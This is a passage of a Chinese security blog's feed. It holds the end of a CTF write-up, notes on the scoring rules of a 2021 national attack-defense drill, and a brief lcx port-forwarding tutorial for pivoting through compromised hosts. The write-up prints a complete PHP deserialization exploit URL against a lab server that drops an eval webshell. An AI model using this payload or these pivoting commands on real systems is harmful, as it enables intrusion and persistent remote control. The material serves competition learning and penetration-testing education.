class="line">http://eci-2zeekzpgsy8b4rsdmpvb.cloudeci1.ichunqiu.com/index.php?r=site%2Fabout&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjI0OiJhc3NlcnQoJF9SRVFVRVNUWyJjbWQiXSkiO31pOjE7czozOiJydW4iO319fX0=&amp;cmd=die(file_put_contents(%27ab.php%27,%27%3C?php%20eval($_REQUEST[%22cmd%22]);?%3E%27))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510185218.png"></p><p>得到一个ab.php的</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210510185302346.png"></p><p>使用蚁剑链接，链接后发现有个readflag 的文件，但是无法直接读取权限为003，直接使用蚁剑的disable_function插件可绕过进行交互式shell读取如下</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510185329.png"></p><p>flag{c70db8f4-5fda-4981-93ab-45b61efd6703}</p><h2 id="7-杂项-colorfulcode"><a href="#7-杂项-colorfulcode" class="headerlink" title="7 杂项-colorfulcode"></a>7 杂项-colorfulcode</h2><p>data1中的数据范围为0-19，data2中的前60字节数据与后面的数据明显不同，猜测data2中前60字节为像素信息，每3字节一个RGB像素点，则刚好20个像素点，编号为0-19，正好对应data1中的0-19数据，使用脚本将data1中的数据替换为像素点，并创建成一张图片。</p><p>data1中数据为7067字节，即一共7067个像素点，分解为宽度<em>高度只有一个结果即37</em>131（或131*37）</p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">a = <span class="string">&#x27;0000000000C000FFFF00FF00FFC0FFFFC0C0C0C0FFC0C000FF00FFFF0000C00000C000C0FFFFFFFFFF00FFFFC000C00000C0C0C0FFFFC0FFC00000FF&#x27;</span></span><br><span class="line">px = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    tmp = (<span class="built_in">int</span>(a[i*<span class="number">6</span>:i*<span class="number">6</span>+<span class="number">2</span>],<span class="number">16</span>),<span class="built_in">int</span>(a[i*<span class="number">6</span>+<span class="number">2</span>:i*<span class="number">6</span>+<span class="number">4</span>],<span class="number">16</span>),<span class="built_in">int</span>(a[i*<span class="number">6</span>+<span class="number">4</span>:i*<span class="number">6</span>+<span class="number">6</span>],<span class="number">16</span>))</span><br><span class="line">    px.append(tmp)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(px)</span><br><span class="line">pic = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">37</span>,<span class="number">191</span>))</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;data1&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">str1 = f.read()</span><br><span class="line">f.close()</span><br><span class="line">str1 = str1.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">191</span>):</span><br><span class="line">        pic.putpixel((x,y), px[<span class="built_in">int</span>(str1[num])])</span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&#x27;xxx.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>执行脚本得到图片</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210512090422.png"></p><p>在线进行转换</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210512090454844.png"></p><p>得到flag</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210512090540.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全竞赛" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="CTF" scheme="http://www.greetdawn.top/tags/CTF/"/>
    
    <category term="红帽杯" scheme="http://www.greetdawn.top/tags/%E7%BA%A2%E5%B8%BD%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>记2021全国hvv演练的点点滴滴</title>
    <link href="http://www.greetdawn.top/2021/04/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/hvv/2021-hvv-country/"/>
    <id>http://www.greetdawn.top/2021/04/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/hvv/2021-hvv-country/</id>
    <published>2021-04-25T06:25:51.000Z</published>
    <updated>2022-02-25T16:30:29.582Z</updated>
    
    <content type="html"><![CDATA[<p>关于国家hvv的基本规则</p><span id="more"></span><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>2021年的全国hvv演练比以往来的稍微早了一些，由于网络安全在国家战略层面的显著提升，各类网安行动如火如荼，一股强烈的网安之风吹遍了整个中华大地。全国演练活动已经开展了几次，相比于往年来说，整个网络安全环境带来了显著提升和优化，这就意味着演练目标变的越来越难打。</p><p>本人有幸代表公安厅参与了此次2021年全国攻防演练的活动，此次活动历经18天左右，在公安部的严密部署下紧张有序的进行着。本人也是首次参加此类规模的攻防演练活动，整个参演团队也都第一次。大家的经验都不是太丰富，其次大家也都是抱着体验，交流，成长的目的来参与此次的攻防演练活动的。但是在最终成绩这一块还是比较满意。整个过程还是比较紧张刺激且富有挑战性的，这里想着花点时间详细整理一下此次攻防过程中的典型细节以及相关感悟，这边主要偏向于一些思路的展开讲解，不过多纠结于技术细节。对于许多的大佬来说，技术其实都是常见技术点，并没有太多的花头。而且就我此次的演练感悟来看，思路是决定最终成绩好坏的最关键因素。就想最终的APT攻击一样，最大程度上利用的人性本身的弱点。在此次的攻防演练中，也是如此。这边本人已将相应的敏感信息进行脱敏处理，并且不进行广泛传播。</p><h2 id="二、过程"><a href="#二、过程" class="headerlink" title="二、过程"></a>二、过程</h2><h3 id="1-评分机制"><a href="#1-评分机制" class="headerlink" title="1 评分机制"></a>1 评分机制</h3><p>国家级攻防演练和省地市演练有所不同，主要收录和参与评分的漏洞主要为系统级权限漏洞，对于一般性不可利用的低危漏洞并不参与计分处理。并且可对内网资产进行渗透。涉及的相关评分机制主要如下:</p><table><thead><tr><th align="center">类型</th><th align="center">评分</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">参演单位域名控制权限</td><td align="center">一级100、二级50</td><td align="center">单个参演单位得分上限500</td></tr><tr><td align="center">获取pc、移动端权限</td><td align="center">pc：20/台、移动端：50/台</td><td align="center">得分上线500、且pc权限必须为system、root</td></tr><tr><td align="center">获取邮箱权限</td><td align="center">邮箱账号口令：20、系统管理员权限：500-1000</td><td align="center"></td></tr><tr><td align="center">办公自动化系统权限</td><td align="center">200-500</td><td align="center">OA、即时通讯、项目管理、财务系统管理员权限</td></tr><tr><td align="center">身份、账户管理平台权限（SSO、4A）</td><td align="center">系统管理权限300、能登陆的系统100</td><td align="center"></td></tr><tr><td align="center">域控系统权限</td><td align="center">管理员200、域内可控服务器10/台</td><td align="center">上限4000</td></tr><tr><td align="center">堡垒机、运维机权限</td><td align="center">管理员200、托管的服务器10/台</td><td align="center">上限4000</td></tr><tr><td align="center">获取大数据系统权限</td><td align="center"></td><td align="center">根据数据量和重要程度给分，上限3000</td></tr><tr><td align="center">获取数据库连接账号密码</td><td align="center">普通50、管理员100</td><td align="center">上限1000</td></tr><tr><td align="center">获取网络设备权限</td><td align="center">网络等级给分，大型300</td><td align="center">需提供路由表及连接量上限2000</td></tr><tr><td align="center">获取工业互联网系统权限</td><td align="center"></td><td align="center">指挥部研判给分</td></tr><tr><td align="center">物联网设备管控平台权限</td><td align="center">控制功能的平台200、连接数5/台</td><td align="center">上限1000</td></tr><tr><td align="center">安全设备权限</td><td align="center">普通50、管理员200</td><td align="center">ids、审计、waf上限1000</td></tr><tr><td align="center">一般web应用、ftp权限</td><td align="center">普通20、管理员100</td><td align="center"></td></tr><tr><td align="center">获取服务器主权限</td><td align="center">普通50、管理员100</td><td align="center"></td></tr><tr><td align="center">突破网络边界</td><td align="center">上限8000</td><td align="center"></td></tr><tr><td align="center">进入逻辑隔离业务内网</td><td align="center">1000</td><td align="center">需提供防火墙vpn网络设备控制截图</td></tr><tr><td align="center">核心生产网</td><td align="center">10000</td><td align="center">铁路调度、银行核心、电力生产等</td></tr><tr><td align="center">发现已植入webshell木马、主机木马</td><td align="center">100-500</td><td align="center"></td></tr><tr><td align="center">发现黑客破解登录主机系统</td><td align="center">100-500</td><td align="center"></td></tr><tr><td align="center">发现主机异常新增账号</td><td align="center">100-500</td><td align="center"></td></tr><tr><td align="center">发现隐蔽控制通道</td><td align="center">100-500</td><td align="center"></td></tr><tr><td align="center">提交0day或未被正式公开N-day</td><td align="center">0-10000</td><td align="center"></td></tr></tbody></table><h3 id="2-报告审核"><a href="#2-报告审核" class="headerlink" title="2 报告审核"></a>2 报告审核</h3><p>提交报告时，有专门的虚拟化软件平台，在此平台内进行报告提交。提交报告不仅要包含完整的攻击文档，且须对整个完整的攻击利用链进行梳理，形成完整的攻击流程图，且对获取的对应资产数量及权限进行逐一填写。反正整个报告的提交流程较为复杂。</p><h3 id="3-资产靶标"><a href="#3-资产靶标" class="headerlink" title="3 资产靶标"></a>3 资产靶标</h3><p>提供的资产靶标主要为内网资产，且我们获取的资产系统主要为国家级政府门户网站及其内网核心系统。</p><p>靶标不会提供具体的ip地址以及对应的url，需要在互联网收集对应靶标的系统入口及可能互联的系统环境及其网站。这样就会</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于国家hvv的基本规则&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://www.greetdawn.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="hvv攻防演练" scheme="http://www.greetdawn.top/tags/hvv%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之端口转发</title>
    <link href="http://www.greetdawn.top/2021/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/security-transform-port/"/>
    <id>http://www.greetdawn.top/2021/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/security-transform-port/</id>
    <published>2021-03-25T02:05:26.000Z</published>
    <updated>2022-02-25T16:42:26.913Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/fog.jpg" alt="fog"></p><span id="more"></span><h1 id="lcx-端口转发应用"><a href="#lcx-端口转发应用" class="headerlink" title="lcx 端口转发应用"></a>lcx 端口转发应用</h1><h2 id="公网服务器开启端口监听"><a href="#公网服务器开启端口监听" class="headerlink" title="公网服务器开启端口监听"></a>公网服务器开启端口监听</h2><p><code>./portmap -m 2 -p1 3950 -h2 公网服务器IP -p2 3951</code></p><p>备注：</p><p>1 这里的3950端口和3951端口在公网IP上都是打开的</p><p>2 命令含义是将公网服务器监听的3950端口接收的数据转发至公网ip的3951端口</p><h2 id="被控制主机转发端口"><a href="#被控制主机转发端口" class="headerlink" title="被控制主机转发端口"></a>被控制主机转发端口</h2><p><code>lcx.exe -slave 公网服务器ip 3950 127.0.0.1</code></p><h2 id="同网段互通主机开启监听"><a href="#同网段互通主机开启监听" class="headerlink" title="同网段互通主机开启监听"></a>同网段互通主机开启监听</h2><p><code>Lcx.exe -listen 51 8888</code></p><p>监听本地的51端口将其转发到8888</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/fog.jpg&quot; alt=&quot;fog&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="代理转发" scheme="http://www.greetdawn.top/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
</feed>
